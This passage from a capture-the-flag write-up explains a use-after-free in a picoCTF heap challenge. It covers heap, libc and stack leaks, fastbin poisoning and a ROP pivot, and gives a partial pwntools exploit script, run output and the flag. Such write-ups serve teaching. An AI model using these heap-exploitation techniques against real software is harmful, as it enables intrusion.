+        ppsVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)operator</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x18</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        ppsVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">study </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(undefined </span><span style="color:#f29e74;">**</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        ppsVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">name </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        ppsVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">name_size </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+        </span><span style="color:#ffd580;">create_student_not_virtual</span><span style="color:#ccc9c2;">(ppsVar3)</span><span style="color:#ccc9c2cc;">;
+        </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index] </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">**</span><span style="color:#ccc9c2;">)ppsVar3</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ccc9c2;">}
+      </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
+        </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(is_virtual</span><span style="color:#f29e74;">? != </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">) {
+                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+          </span><span style="color:#f28779;">abort</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+        </span><span style="color:#ccc9c2;">}
+        puVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)operator</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x18</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        puVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">study </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(undefined </span><span style="color:#f29e74;">**</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        puVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">name </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        puVar3</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">name_size </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+        </span><span style="color:#ffd580;">create_student_virtual</span><span style="color:#ccc9c2;">(puVar3)</span><span style="color:#ccc9c2cc;">;
+        </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index] </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">**</span><span style="color:#ccc9c2;">)puVar3</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ccc9c2;">}
+      </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:
+      </span><span style="color:#ffd580;">set_name</span><span style="color:#ccc9c2;">((student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index])</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:
+      </span><span style="color:#ffd580;">print_name</span><span style="color:#ccc9c2;">((student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index])</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">:
+      </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">(code </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index])</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">study)((</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index])</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ccc9c2;">      psVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">students</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">)[student_index]</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(psVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ccc9c2;">(student </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2;">) {
+        </span><span style="color:#ffd580;">cleanup_student</span><span style="color:#ccc9c2;">(psVar1)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">        operator</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">delete</span><span style="color:#ccc9c2;">(psVar1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x18</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+      </span><span style="color:#ccc9c2;">}
+      </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">default</span><span style="color:#ccc9c2cc;">:
+                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+      </span><span style="color:#f28779;">abort</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ccc9c2;">}
+  } </span><span style="color:#ffa759;">while</span><span style="color:#ccc9c2;">( </span><span style="color:#ffcc66;">true </span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+</span></code></pre>
+<p>Besides the obvious menu options, there are a few things to note. It's under some pretty onerous seccomp restrictions and also it calls alarm(0x1e) so it will terminate after 30 seconds. I patched out my local copy so I could develop without that messing me up. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ seccomp-tools dump ./chall
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
+ 0008: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0011
+ 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
+ 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+</span></code></pre>
+<p>We have five menu options. Our input is a menu option and an index (to a table of students) to operate on. </p>
+<h3 id="create-a-student">create a student</h3>
+<p>Creating a student will allocate memory of size 0x18 and then fill it out. </p>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">Student </span><span style="color:#ccc9c2;">{
+	</span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">**</span><span style="color:#ccc9c2;"> function_ptr
+	</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;"> name
+	</span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> name_size		
+}
+</span></code></pre>
+<p>Name and name size are both initialized to 0, function_ptr is allocated to one of two virtual functions depending on your input. This virtual function will either print out a newline or a brief sentence and then a newline. </p>
+<h3 id="set-student-name">set student name</h3>
+<p>Setting the student name will free the existing name, and then allow you to set a new name with a size of your choice. </p>
+<h3 id="print-student-name">print student name</h3>
+<p>Printing the student name will print the string pointed to by student-&gt;name, terminating at null. </p>
+<h3 id="study">&quot;study&quot;</h3>
+<p>&quot;study&quot; executes the function pointer in the student struct. </p>
+<h3 id="remote-student">remote student</h3>
+<p>The remote student option will free the student name if it exists and then free the student. Importantly, it does not clean up the student global variable which means this is a use-after-free vulnerability. </p>
+<h2 id="so-how-do-i-exploit-this">so how do i exploit this?</h2>
+<p>We can take advantage of the UAF to get a student pointer sharing memory with an allocated name (which we control the data for). This means we can construct a fake student with arbitrary data. The process looks like this and it gets us arbitrary read and the ability to call arbitrary address (although the function pointer address gets dereferenced, so we need to actually put an address containing our target function)</p>
+<ol>
+<li>allocate student 0</li>
+<li>allocate student 1</li>
+<li>free student 0</li>
+<li>allocate name for student 1 of size 0x18 (student struct size)</li>
+<li>construct a fake student object as name</li>
+<li>exec function pointer or print name</li>
+</ol>
+<p>This is a pretty hefty primitive, but not sufficient to really get anywhere. We're going to need more information to actually exploit this, so first order of business is to break ASLR/PIE. </p>
+<h3 id="leaking-the-heap-base-and-program-base">leaking the heap base (and program base)</h3>
+<p>This is pretty similar to the concept I mentioned in the previous section for arbitrary read but requires some tcache manipulation to get everything working. The idea is to allocate a student and name, but that name is actually a chunk in tcache or student. The first 8 bytes in those would be a heap pointer (tcache linked list) or program address (virtual function) respectively. </p>
+<ol>
+<li>allocate student 0</li>
+<li>allocate name for student 0 of size 0x18</li>
+<li>fill 0x20 tcache to size 6</li>
+<li>free student 0; the freeing process will delete the name before the student so the name will be in tcache and the student goes to fastbin. </li>
+<li>print student 0's name -- this will be a pointer on the heap and you can calculate the base from it</li>
+<li>allocate student 1 -- this will pull the most recently entered chunk from tcache, which will be student 0's name. </li>
+<li>print student 0's name again -- now it's a pointer into program memory and we can calculate program base from it</li>
+</ol>
+<h3 id="leaking-libc-and-stack">leaking libc and stack</h3>
+<p>Armed with the program base and an arbitrary read, it's pretty trivial to leak the base of libc from the GOT. We can then do something similar with libc.  Libc has two symbols which point onto the stack -- &quot;__libc_argv&quot; and &quot;environ&quot;.  We can just arbitrary read those and then calculate stack offsets off that. </p>
+<h3 id="arbitrary-write">arbitrary write?</h3>
+<p>I <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c">poisoned fastbin</a> to get malloc to return an arbitrary pointer. I found that I could only do this once because fastbin just sorta stopped filling and I'm not really familiar enough with heap exploitation to speculate as to why. Although potentially possible to fix, I ended up not bothering because I found a way to pivot the 24 byte write into an arbitrary length ROP. </p>
+<h3 id="pivoting-onto-a-heap-rop-chain">pivoting onto a heap ROP chain</h3>
+<p>We have arbitrary write, but restricted to 24 bytes and can only do it once. What can we do with that? Can't use a one_gadget because of seccomp, highly likely we will need to construct our own chain to print the flag. Turns out, libc has a handy &quot;pop rsp; ret;&quot; gadget for us to play with. We can just allocate a big name, drop our ROP chain onto that, and then pivot stack onto that. At this point we have an arbitrarily large ROP chain and can just open/read/write our way to the flag. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py REMOTE
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/chall.patch&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b&#39;.&#39;
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/libc.so.6&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/ld-2.27.so&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to mars.picoctf.net on port 31638: Done
+[*] heap base: 0x561a01961000
+[*] program base: 0x5619ffa9c000
+[*] libc base: 0x7f63ad50c000
+[*] stored RIP: 0x7fff1e4faad8
+[*] Switching to interactive mode
+picoCTF{0nl1ne_d3bat3_sux}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+
+</span><span style="color:#ccc9c2;">exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;chall.patch&quot;</span><span style="color:#ccc9c2;">)
+libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span style="color:#ccc9c2;">)
+ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;./ld-2.27.so&quot;</span><span style="color:#ccc9c2;">)
+
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
+    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">REMOTE:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;mars.picoctf.net&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">31638</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">elif </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">GDB:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;c&quot;</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path])
+
+MENU_DELIM </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4. Remote student</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_heap</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2;">):
+
+    </span><span style="font-style:italic;color:#5c6773;"># if we free and don&#39;t reallocate
+    # the name pointer will be pointing to a tcache heap chunk
+    # which has a pointer to the next chunk in that tcache
+    # we can snag that with the name print
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 0 24&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;48&quot; </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    </span><span style="font-style:italic;color:#5c6773;"># empty tcache and then create another student, allowing us to refill it to 6
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">6</span><span style="color:#ccc9c2;">): 
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;0 </span><span style="color:#ccc9c2;">{i </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">}</span><span style="color:#bae67e;"> 0&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">())
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 1&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 2&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 0&quot;</span><span style="color:#ccc9c2;">)
+
+    heap_value </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">heap_value </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x13cf0
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_program_base</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2;">):
+
+    </span><span style="font-style:italic;color:#5c6773;"># student structs have a vtable ptr
+    # lets just snag that and calculate program base
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 0 24&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;48&quot; </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 3&quot;</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># students were populated when leaking heap, can just use one of those lol
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 1 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 0&quot;</span><span style="color:#ccc9c2;">)
+
+    program_value </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">program_value </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x202ce8
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_libc_base</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">program_base</span><span style="color:#ccc9c2;">):
+
+    </span><span style="font-style:italic;color:#5c6773;"># we can retrieve a libc address from the GOT
+    # assuming we have the program base
+
+
+    </span><span style="color:#ccc9c2;">got_malloc_offset </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x202f88
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># alloc student 0, 0 virtual
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 1 0&quot;</span><span style="color:#ccc9c2;">) 
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 1 24&quot;</span><span style="color:#ccc9c2;">) </span><span style="font-style:italic;color:#5c6773;"># set name for student 1, size 24
+
